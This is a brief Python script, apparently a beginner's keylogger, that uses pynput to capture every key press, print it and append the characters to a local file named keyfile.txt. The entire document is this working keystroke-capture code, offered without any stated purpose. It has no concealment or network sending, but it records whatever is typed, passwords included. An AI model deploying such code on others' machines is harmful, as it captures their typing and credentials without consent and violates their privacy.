from pynput import keyboard

def keyPress(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            ch= key.char
            logKey.write(ch)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listen = keyboard.Listener(on_press=keyPress)
    listen.start()
    input()
